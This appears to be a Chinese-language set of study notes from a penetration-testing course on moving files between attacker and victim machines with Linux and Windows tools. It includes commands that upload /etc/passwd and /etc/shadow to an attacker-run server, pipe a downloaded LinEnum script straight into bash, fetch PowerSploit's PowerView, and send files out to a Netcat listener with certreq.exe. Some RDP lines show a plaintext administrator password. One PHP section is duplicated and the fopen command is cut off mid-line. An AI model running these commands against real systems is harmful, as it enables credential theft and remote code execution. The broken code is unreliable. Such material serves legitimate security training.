```

现在我们可以开始传输文件了。我们需要指定 Pwnbox 的 IP 地址以及用户名和密码。

**Linux - 使用 SCP 下载文件**
```shell-session
tr01ax@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt .
```

### 上传

#### Web 上传

如 [[Lesson 02 - Windows File Transfer Methods|Windows 文件传输方法部分]] 所述，我们可以使用 [uploadserver](https://github.com/Densaugeo/uploadserver)，这是 Python `HTTP.Server` 模块的扩展模块，包含文件上传页面。对于这个 Linux 示例，让我们看看如何配置 `uploadserver` 模块以使用 `HTTPS` 进行安全通信。

我们需要做的第一件事是安装 `uploadserver` 模块。

**Pwnbox - 启动 Web 服务器**
```shell-session
tr01ax@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

现在我们需要创建一个证书。在这个示例中，我们使用自签名证书。

**Pwnbox - 创建自签名证书**
```shell-session
tr01ax@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

Web 服务器不应该托管证书文件。我们建议创建一个新目录来托管 Web 服务器的文件。

#### Pwnbox - 启动 Web 服务器

Pwnbox - 启动 Web 服务器

```shell-session
tr01ax@htb[/htb]$ mkdir https && cd https
```

Pwnbox - 启动 Web 服务器

```shell-session
tr01ax@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

现在从我们的受害机器上，让我们上传 `/etc/passwd` 和 `/etc/shadow` 文件。

**Linux - 上传多个文件**
```shell-session
tr01ax@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

我们使用了 `--insecure` 选项，因为我们使用的是我们信任的自签名证书。

#### Linux - 使用 Python 或 PHP 创建 Web 服务器

在目标机器上启动 Web 服务器，以便将文件下载到攻击机器

**Linux - 使用 Python3 创建 Web 服务器**
```shell-session
tr01ax@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Linux - 使用 Python2.7 创建 Web 服务器**
```shell-session
tr01ax@htb[/htb]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Linux - 使用 PHP 创建 Web 服务器**
```shell-session
tr01ax@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

**Linux - 使用 Ruby 创建 Web 服务器**
```shell-session
tr01ax@htb[/htb]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

## 使用代码传输文件

--> [[Lesson 04 - Transfering Files with Code|详细信息请参阅这里]]

### Python

Python 是一种流行的编程语言。目前支持版本 3，但我们可能会发现某些服务器上仍然存在 Python 2.7 版本。`Python` 可以使用 `-c` 选项从操作系统命令行运行单行代码。让我们看一些示例：

**Python 2 - 下载**
```shell-session
tr01ax@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**Python 3 - 下载**
```shell-session
tr01ax@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### PHP

**PHP 使用 File_get_contents() 下载**
```shell-session
tr01ax@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

`file_get_contents()` 和 `file_put_contents()` 的替代方案是 [fopen() 模块](https://www.php.net/manual/en/function.fopen.php)。我们可以使用此模块打开 URL，读取其内容并保存到文件中。

**PHP 使用 File_get_contents() 下载**
```shell-session
tr01ax@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

`file_get_contents()` 和 `file_put_contents()` 的替代方案是 [fopen() 模块](https://www.php.net/manual/en/function.fopen.php)。我们可以使用此模块打开 URL，读取其内容并保存到文件中。

**PHP 使用 Fopen() 下载**
```shell-session
tr01ax@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote =
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $fl
```

**PHP 下载文件并通过管道传递给 Bash**
```shell-session
tr01ax@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### 其他语言

--> [[Lesson 04 - Transfering Files with Code#^dd72a9|其他语言]]
--> [[Lesson 04 - Transfering Files with Code#^e9a638|JavaScript]]
--> [[Lesson 04 - Transfering Files with Code#^31ae1b|VBScript]]

### 使用 Python 上传
--> [[Lesson 04 - Transfering Files with Code#^f95651|详细信息请参阅这里]]

**启动 Python uploadserver 模块**
```shell-session
tr01ax@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**使用 Python 单行代码上传文件**
```shell-session
tr01ax@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```


### JavaScript

以下 JavaScript 代码基于[这篇](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068)帖子，我们可以使用它来下载文件。我们将创建一个名为 `wget.js` 的文件并保存以下内容：

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

使用 JavaScript 和 cscript.exe 下载文件

```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```


### VBScript

以下 VBScript 示例可以基于[这篇](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs)帖子使用。我们将创建一个名为 `wget.vbs` 的文件并保存以下内容：

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

使用 VBScript 和 cscript.exe 下载文件

```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### 使用 Python3 进行上传操作

[[Lesson 04 - Transfering Files with Code#^f95651|详细信息请参阅这里]]

如果我们想上传文件，我们需要了解特定编程语言中执行上传操作的函数。Python3 的 [requests 模块](https://pypi.org/project/requests/)允许你使用 Python 发送 HTTP 请求（GET、POST、PUT 等）。如果我们想将文件上传到 Python3 的 [uploadserver](https://github.com/Densaugeo/uploadserver)，可以使用以下代码。

**启动 Python uploadserver 模块**
```shell-session
tr01ax@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**使用 Python 单行代码上传文件**
```shell-session
tr01ax@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## 其他文件传输方法

[[Lesson 05 - Miscellaneous File Transfer Methods|详细信息请参阅这里]]

**值得注意的方法**

使用 xfreerdp 挂载 Linux 文件夹
```shell-session
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

使用 rdesktop 挂载 Linux 文件夹
```shell-session
tr01ax@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

## Living off the Land（利用现有工具）

[[Lesson 08 - Living off The Land|详细信息请参阅这里]]

我们需要使用 Netcat 在攻击主机上监听一个端口以接收传入流量，然后执行 certreq.exe 来上传文件。

将 win.ini 上传到我们的 Pwnbox

```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

这会将文件发送到我们的 Netcat 会话，我们可以复制粘贴其内容。

在 Netcat 会话中接收文件

```shell-session
tr01ax@htb[/htb]$ sudo nc -lvnp 80
```
